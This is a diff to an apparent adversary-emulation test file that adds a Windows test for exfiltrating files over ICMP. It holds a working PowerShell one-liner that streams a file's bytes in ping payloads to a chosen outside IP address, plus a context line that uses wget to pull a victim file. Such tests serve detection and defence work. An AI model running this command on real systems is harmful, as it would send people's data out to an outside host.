@@ -91,3 +91,25 @@ atomic_tests:
       3. To retrieve the data from an adversary system:
 
           wget http://VICTIM_IP:1337/victim-file.txt
+
+- name: Exfiltration Over Alternative Protocol - ICMP
+  description: |
+    Exfiltration of specified file over ICMP protocol.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    input_file:
+      description: Path to file to be exfiltrated.
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    ip_address:
+      description: Destination IP address where the data should be sent.
+      type: String
+      default: 1.1.1.1
+
+  executor:
+    name: powershell
+    command: |
+      $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
